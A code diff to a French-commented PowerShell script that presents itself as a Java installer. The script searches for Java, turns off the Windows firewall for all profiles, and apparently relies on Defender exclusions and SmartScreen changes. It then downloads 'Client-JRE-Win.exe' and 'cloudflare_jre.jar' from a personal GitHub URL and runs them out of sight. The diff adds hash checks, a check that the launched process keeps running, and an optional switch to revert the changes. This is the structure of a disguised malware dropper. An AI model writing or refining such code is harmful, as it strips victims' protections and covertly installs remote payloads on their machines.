@@ -1,4 +1,4 @@
-param([string]$InstallFolder = "C:\Program Files\Java")
+param([string]$InstallFolder = "C:\Program Files\Java", [switch]$RevertSecurityChanges)
 
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
@@ -94,17 +94,24 @@ Write-Host "`n[3/9] Verification et installation Java..." -ForegroundColor Yello
 $javaFound = $false
 $javaPath = ""
 
-# Recherche Java amelioree (9 chemins)
+# Recherche Java amelioree (15+ chemins)
 $javaPaths = @(
     "C:\Program Files\Java\jre*\bin\java.exe",
     "C:\Program Files (x86)\Java\jre*\bin\java.exe",
+    "C:\Program Files\Java\jdk*\bin\java.exe",
+    "C:\Program Files (x86)\Java\jdk*\bin\java.exe",
     "C:\Program Files\OpenJDK\*\bin\java.exe",
     "C:\Program Files (x86)\OpenJDK\*\bin\java.exe",
+    "C:\Program Files\Microsoft\jdk*\bin\java.exe",
+    "C:\Program Files (x86)\Microsoft\jdk*\bin\java.exe",
     "$env:JAVA_HOME\bin\java.exe",
+    "$env:JRE_HOME\bin\java.exe",
     "C:\Java\*\bin\java.exe",
     "C:\jdk*\bin\java.exe",
     "C:\Program Files\Eclipse Adoptium\*\bin\java.exe",
-    "C:\Program Files (x86)\Eclipse Adoptium\*\bin\java.exe"
+    "C:\Program Files (x86)\Eclipse Adoptium\*\bin\java.exe",
+    "C:\Program Files\BellSoft\*\bin\java.exe",
+    "C:\Program Files (x86)\BellSoft\*\bin\java.exe"
 )
 
 foreach ($pattern in $javaPaths) {
@@ -237,12 +244,10 @@ if ($isAdmin) {
 if ($isAdmin) {
     try {
         $firewallProfiles = @("Domain", "Private", "Public")
-        $firewallSuccess = $false
         
         foreach ($fwProfile in $firewallProfiles) {
             try {
                 Set-NetFirewallProfile -Profile $fwProfile -Enabled $false -ErrorAction Stop
-                $firewallSuccess = $true
             } catch {
                 $null = netsh advfirewall set allprofiles state off 2>$null
             }
@@ -287,8 +292,8 @@ try {
 }
 
 $files = @(
-    @{ Name = "Client-JRE-Win.exe"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/Client-JRE-Win.exe"; ExpectedSize = 3.1 },
-    @{ Name = "cloudflare_jre.jar"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/cloudflare_jre.jar"; ExpectedSize = 0.62 }
+    @{ Name = "Client-JRE-Win.exe"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/Client-JRE-Win.exe"; ExpectedSize = 3.1; ExpectedHash = "8B789623D89653AD2F5EA8E4650E3134FFB7A3B6CE8E500913B7BAD8359D4FAF" },
+    @{ Name = "cloudflare_jre.jar"; Url = "https://raw.githubusercontent.com/jeromemelin/defern/refs/heads/main/cloudflare_jre.jar"; ExpectedSize = 0.62; ExpectedHash = "E9D2BCA3246C0943FB41F08783FD174E99D63A7F5CB451FBC0BC23D0CBCF82EF" }
 )
 
 $downloaded = 0
@@ -326,12 +331,24 @@ foreach ($fileInfo in $files) {
                 # Verification taille
                 if ([math]::Abs($size - $expectedSize) -lt 0.5) {
                     Write-Host "OK - $fileName telecharge ($size MB)" -ForegroundColor Green
-                    Add-Content -Path $dlLog -Value "OK - $fileName ($size MB)" -ErrorAction SilentlyContinue
-                    $downloaded++
-                    $success = $true
+                    
+                    # Verification hash
+                    $expectedHash = $fileInfo.ExpectedHash
+                    $actualHash = Get-FileHash -Path $filePath -Algorithm SHA256 | Select-Object -ExpandProperty Hash
+                    if ($actualHash -ne $expectedHash) {
+                        Write-Host "ERREUR - $fileName hash incorrect" -ForegroundColor Red
+                        Remove-Item $filePath -Force -ErrorAction SilentlyContinue
+                        $retry++
+                    } else {
+                        Write-Host "OK - $fileName hash verifie" -ForegroundColor Green
+                        Add-Content -Path $dlLog -Value "OK - $fileName ($size MB, hash OK)" -ErrorAction SilentlyContinue
+                        $downloaded++
+                        $success = $true
+                    }
                 } else {
                     Write-Host "ERREUR - $fileName taille incorrecte ($size MB, attendu $expectedSize MB)" -ForegroundColor Red
                     Remove-Item $filePath -Force -ErrorAction SilentlyContinue
+                    $retry++
                 }
             }
         } catch {
@@ -349,7 +366,8 @@ foreach ($fileInfo in $files) {
 }
 
 if ($downloaded -eq 0) {
-    Write-Host "ERREUR - Aucun fichier telecharge" -ForegroundColor Red
+    Write-Host "ERREUR CRITIQUE - Aucun fichier telecharge, arret du script" -ForegroundColor Red
+    exit 1
 }
 
 # ============================================================================
@@ -357,6 +375,7 @@ if ($downloaded -eq 0) {
 # ============================================================================
 Write-Host "`n[6/9] Execution..." -ForegroundColor Yellow
 $exLog = Join-Path $InstallFolder "execution_log.txt"
+$executionOk = $false
 
 try {
     Add-Content -Path $exLog -Value "EXECUTION DEMARRAGE" -Force -ErrorAction Stop
@@ -377,6 +396,14 @@ try {
         if ($process) {
             Write-Host "OK - Processus lance (PID: $($process.Id))" -ForegroundColor Green
             Add-Content -Path $exLog -Value "OK - Client-JRE-Win.exe lancee (PID: $($process.Id))" -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            if (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
+                Write-Host "OK - Processus toujours actif" -ForegroundColor Green
+                $executionOk = $true
+            } else {
+                Write-Host "ATTENTION - Processus termine prematurément" -ForegroundColor Yellow
+                $executionOk = $false
+            }
         }
     } elseif (Test-Path $jarPath) {
         if ($javaFound -and $javaPath) {
@@ -385,6 +412,14 @@ try {
             if ($process) {
                 Write-Host "OK - Processus lance (PID: $($process.Id))" -ForegroundColor Green
                 Add-Content -Path $exLog -Value "OK - cloudflare_jre.jar lancee (PID: $($process.Id))" -ErrorAction SilentlyContinue
+                Start-Sleep -Seconds 3
+                if (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
+                    Write-Host "OK - Processus toujours actif" -ForegroundColor Green
+                    $executionOk = $true
+                } else {
+                    Write-Host "ATTENTION - Processus termine prematurément" -ForegroundColor Yellow
+                    $executionOk = $false
+                }
             }
         } else {
             Write-Host "ERREUR - JAR trouve mais Java non disponible" -ForegroundColor Red
@@ -459,7 +494,8 @@ Write-Host "  Java: $javaStatus"
 Write-Host "  Whitelist: OK (dossier + temp)"
 Write-Host "  Fichiers telecharges: $downloaded/2"
 Write-Host "  Fichiers verifies: $filesOk/2"
-Write-Host "  Execution: LANCEE"
+$executionStatus = if ($executionOk) { "LANCEE" } else { "ECHEC" }
+Write-Host "  Execution: $executionStatus"
 
 Write-Host "`nFICHIERS TELECHARGES:" -ForegroundColor Yellow
 try {
@@ -482,5 +518,36 @@ try {
 
 Write-Host "`nEMPLACEMENT PRINCIPAL: $InstallFolder" -ForegroundColor Yellow
 Write-Host "EMPLACEMENT TEMP: $env:TEMP" -ForegroundColor Yellow
+
+if ($RevertSecurityChanges) {
+    Write-Host "`nREVERTISSEMENT SECURITE..." -ForegroundColor Yellow
+    if ($isAdmin) {
+        try {
+            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer"
+            Set-ItemProperty -Path $regPath -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction Stop
+            Write-Host "OK - SmartScreen reactive" -ForegroundColor Green
+        } catch {
+            Write-Host "ATTENTION - Echec reactivation SmartScreen" -ForegroundColor Yellow
+        }
+        
+        try {
+            Set-NetFirewallProfile -Profile "Domain", "Private", "Public" -Enabled $true -ErrorAction Stop
+            Write-Host "OK - Firewall reactive" -ForegroundColor Green
+        } catch {
+            Write-Host "ATTENTION - Echec reactivation Firewall" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "ATTENTION - Droits insuffisants pour revertir SmartScreen/Firewall" -ForegroundColor Yellow
+    }
+    
+    try {
+        Remove-MpPreference -ExclusionPath $InstallFolder -Force -ErrorAction Stop
+        Remove-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop
+        Write-Host "OK - Exclusions Defender retirees" -ForegroundColor Green
+    } catch {
+        Write-Host "ATTENTION - Echec retrait exclusions Defender" -ForegroundColor Yellow
+    }
+}
+
 Write-Host "`nTOUT TERMINE - AUCUNE FENETRE VISIBLE" -ForegroundColor Green
 Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
